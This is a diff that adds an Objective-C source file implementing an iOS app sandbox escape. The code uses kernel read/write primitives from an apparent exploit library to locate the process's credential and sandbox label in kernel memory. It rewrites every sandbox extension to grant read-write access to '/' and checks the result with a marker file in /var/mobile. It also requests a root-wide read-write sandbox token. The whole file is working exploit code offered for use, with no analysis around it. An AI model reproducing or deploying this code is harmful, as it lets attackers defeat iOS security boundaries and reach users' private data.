@@ -1,0 +1,266 @@
+//
+//  sbx.m
+//  lara
+//
+//  Created by ruter on 05.04.26.
+//
+
+#import <Foundation/Foundation.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <errno.h>
+#include <dlfcn.h>
+#include <string.h>
+#include <stdarg.h>
+#include <sys/sysctl.h>
+#include <mach/machine.h>
+
+#include "sbx.h"
+#include "darksword.h"
+
+typedef void (*sbx_log_callback_t)(const char *message);
+static sbx_log_callback_t g_sbx_log = NULL;
+
+void sbx_setlogcallback(sbx_log_callback_t callback) {
+    g_sbx_log = callback;
+}
+
+static void sbx_log(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
+static void sbx_log(const char *fmt, ...) {
+    char buf[1024];
+    va_list ap;
+    va_start(ap, fmt);
+    vsnprintf(buf, sizeof(buf), fmt, ap);
+    va_end(ap);
+    if (g_sbx_log) g_sbx_log(buf);
+    NSLog(@"%s", buf);
+}
+
+#define KRW_LEN 0x20
+
+#define OFF_PROC_PROC_RO       0x18
+#define OFF_PROC_RO_UCRED      0x20
+#define OFF_UCRED_CR_LABEL     0x78
+#define OFF_LABEL_SANDBOX      0x10
+#define OFF_SANDBOX_EXT_SET    0x10
+#define OFF_EXT_DATA           0x40
+#define OFF_EXT_DATALEN        0x48
+
+#define T1SZ_BOOT 0x19
+
+static bool ispac(void) {
+    cpu_subtype_t cpusubtype = 0;
+    size_t sz = sizeof(cpusubtype);
+    if (sysctlbyname("hw.cpusubtype", &cpusubtype, &sz, NULL, 0) != 0) {
+        return false;
+    }
+    return cpusubtype == CPU_SUBTYPE_ARM64E;
+}
+
+static inline uint64_t xpaci(uint64_t a) {
+    if (!ispac()) return a;
+    if ((a & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) return a;
+
+    register uint64_t x0 asm("x0") = a;
+    asm volatile(".long 0xDAC143E0" : "+r"(x0)); // XPACI X0
+    return x0;
+}
+
+static inline uint64_t signptr(uint64_t v) {
+    if ((v >> 32) > 0xFFFF) return v | 0xFFFFFF8000000000ULL;
+    return v;
+}
+
+#define S(x) ({ uint64_t _v = xpaci(x); signptr(_v); })
+#define K(x) ((x) > 0xFFFFFF8000000000ULL)
+
+static uint64_t smrdecode(uint64_t value, uint64_t base) {
+    uint64_t bits = (base << (62 - T1SZ_BOOT));
+    if ((value & bits) == 0) {
+        return ((value & (0xFFFFFFFFFFFFC000ULL & ~bits)) | bits);
+    }
+    return (value & 0xFFFFFFFFFFFFFFE0ULL);
+}
+
+static uint64_t kreadsmrguess(uint64_t raw) {
+    uint64_t pac = S(raw);
+    if (K(pac)) return pac;
+
+    uint64_t d2 = smrdecode(pac, 2);
+    if (K(d2)) return d2;
+
+    uint64_t d3 = smrdecode(pac, 3);
+    if (K(d3)) return d3;
+
+    return pac;
+}
+
+static void patchext(uint64_t ext) {
+    uint64_t da = ds_kread64(ext + OFF_EXT_DATA);
+    uint64_t dl = ds_kread64(ext + OFF_EXT_DATALEN);
+    if (K(da) && dl > 0) {
+        uint8_t buf[KRW_LEN];
+        ds_kread(da, buf, KRW_LEN);
+        buf[0] = '/'; buf[1] = 0;
+        ds_kwrite(da, buf, KRW_LEN);
+    }
+    uint8_t chunk[KRW_LEN];
+    ds_kread(ext + OFF_EXT_DATA, chunk, KRW_LEN);
+    *(uint64_t*)(chunk + 0x08) = 1;
+    *(uint64_t*)(chunk + 0x10) = 0xFFFFFFFFFFFFFFFFULL;
+    ds_kwrite(ext + OFF_EXT_DATA, chunk, KRW_LEN);
+}
+
+static int patchchain(uint64_t hdr) {
+    int n = 0;
+    for (int i = 0; i < 64 && K(hdr); i++) {
+        uint64_t ext = S(ds_kread64(hdr + 0x8));
+        if (K(ext)) { patchext(ext); n++; }
+        uint64_t next = ds_kread64(hdr);
+        if (!next || !K(next)) break;
+        hdr = S(next);
+    }
+    return n;
+}
+
+static void setrwclass(uint64_t hdr) {
+    uint64_t ext = S(ds_kread64(hdr + 0x8));
+    if (!K(ext)) return;
+    uint64_t da = ds_kread64(ext + OFF_EXT_DATA);
+    if (!K(da)) return;
+
+    const char *rw = "com.apple.app-sandbox.read-write";
+    uint8_t b1[KRW_LEN], b2[KRW_LEN];
+    memset(b1, 0, KRW_LEN); memset(b2, 0, KRW_LEN);
+    memcpy(b1, rw, KRW_LEN);
+    ds_kwrite(da + 32, b1, KRW_LEN);
+    ds_kwrite(da + 64, b2, KRW_LEN);
+
+    uint8_t hb[KRW_LEN];
+    ds_kread(hdr, hb, KRW_LEN);
+    *(uint64_t*)(hb + 0x10) = da + 32;
+    ds_kwrite(hdr, hb, KRW_LEN);
+}
+
+int sbx_escape(uint64_t self_proc) {
+    if (!self_proc) { sbx_log("self_proc is NULL"); return -1; }
+
+    uint64_t proc_ro_raw = ds_kread64(self_proc + OFF_PROC_PROC_RO);
+    uint64_t proc_ro = S(proc_ro_raw);
+    sbx_log("self_proc=0x%llx proc_ro_raw=0x%llx proc_ro=0x%llx", self_proc, proc_ro_raw, proc_ro);
+    if (!K(proc_ro)) { sbx_log("proc_ro invalid"); return -1; }
+
+    sbx_log("scanning proc_ro for ucred...");
+    uint64_t ucred = 0;
+    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
+        uint64_t raw = ds_kread64(proc_ro + off);
+        uint64_t smr = kreadsmrguess(raw);
+        uint64_t pac = S(raw);
+        sbx_log("  proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx", off, raw, smr, pac);
+
+        if (K(smr)) {
+            uint64_t maybe_label = S(ds_kread64(smr + OFF_UCRED_CR_LABEL));
+            if (K(maybe_label)) {
+                uint64_t maybe_sandbox = S(ds_kread64(maybe_label + OFF_LABEL_SANDBOX));
+                if (K(maybe_sandbox)) {
+                    sbx_log("found ucred at proc_ro+0x%x (SMR) = 0x%llx", off, smr);
+                    ucred = smr;
+                    break;
+                }
+            }
+        }
+        if (!ucred && K(pac)) {
+            uint64_t maybe_label = S(ds_kread64(pac + OFF_UCRED_CR_LABEL));
+            if (K(maybe_label)) {
+                uint64_t maybe_sandbox = S(ds_kread64(maybe_label + OFF_LABEL_SANDBOX));
+                if (K(maybe_sandbox)) {
+                    sbx_log("found ucred at proc_ro+0x%x (PAC) = 0x%llx", off, pac);
+                    ucred = pac;
+                    break;
+                }
+            }
+        }
+    }
+    if (!K(ucred)) { sbx_log("ucred not found in proc_ro"); return -1; }
+
+    uint64_t label = S(ds_kread64(ucred + OFF_UCRED_CR_LABEL));
+    if (!K(label)) { sbx_log("cr_label invalid"); return -1; }
+
+    uint64_t sandbox = S(ds_kread64(label + OFF_LABEL_SANDBOX));
+    if (!K(sandbox)) { sbx_log("sandbox invalid"); return -1; }
+
+    uint64_t ext_set = S(ds_kread64(sandbox + OFF_SANDBOX_EXT_SET));
+    if (!K(ext_set)) { sbx_log("ext_set invalid"); return -1; }
+
+    sbx_log("proc_ro=0x%llx ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx",
+          proc_ro, ucred, label, sandbox, ext_set);
+
+    int patched = 0;
+    for (int s = 0; s < 16; s++) {
+        uint64_t hdr = S(ds_kread64(ext_set + s * 8));
+        if (K(hdr)) patched += patchchain(hdr);
+    }
+    sbx_log("patched %d extensions", patched);
+
+    int classed = 0;
+    for (int s = 0; s < 16; s++) {
+        uint64_t hdr = S(ds_kread64(ext_set + s * 8));
+        if (K(hdr) && K(ds_kread64(hdr + 0x10))) { setrwclass(hdr); classed++; }
+    }
+    sbx_log("changed %d extension classes", classed);
+
+    uint64_t src = 0;
+    for (int s = 0; s < 16 && !src; s++) {
+        uint64_t h = S(ds_kread64(ext_set + s * 8));
+        if (K(h)) src = h;
+    }
+    if (src) {
+        int filled = 0;
+        for (int s = 0; s < 16; s++) {
+            uint64_t h = ds_kread64(ext_set + s * 8);
+            if (!h || !K(h)) { ds_kwrite64(ext_set + s * 8, src); filled++; }
+        }
+        sbx_log("filled %d empty hash slots", filled);
+    }
+
+    int fd_w = open("/var/mobile/.rooootwashere", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd_w >= 0) { close(fd_w); unlink("/var/mobile/.rooootwashere"); }
+
+    if (fd_w >= 0) {
+        sbx_log("escaped!");
+        return 0;
+    }
+
+    sbx_log("sandbox escape verification failed (errno=%d: %s)", errno, strerror(errno));
+    return -1;
+}
+
+void gettoken(void) {
+    void *handle = dlopen("/System/Library/Frameworks/Sandbox.framework/Sandbox", RTLD_LAZY);
+    if (!handle) {
+        printf("failed to load sandbox framework: %s\n", dlerror());
+        return;
+    }
+
+    dlerror();
+    char *(*sandbox_extension_issue_ptr)(const char *, const char *, uint32_t) =
+        (char *(*)(const char *, const char *, uint32_t))dlsym(handle, "sandbox_extension_issue");
+
+    char *err = dlerror();
+    if (err != NULL || !sandbox_extension_issue_ptr) {
+        printf("failed to find sandbox_extension_issue: %s\n", err ? err : "unknown");
+        dlclose(handle);
+        return;
+    }
+
+    char *token = sandbox_extension_issue_ptr("com.apple.app-sandbox.read-write", "/", 0);
+    if (!token) {
+        printf("failed: %s (errno: %d)\n", strerror(errno), errno);
+        dlclose(handle);
+        return;
+    }
+
+    printf("token: %s\n", token);
+    free(token);
+    dlclose(handle);
+}
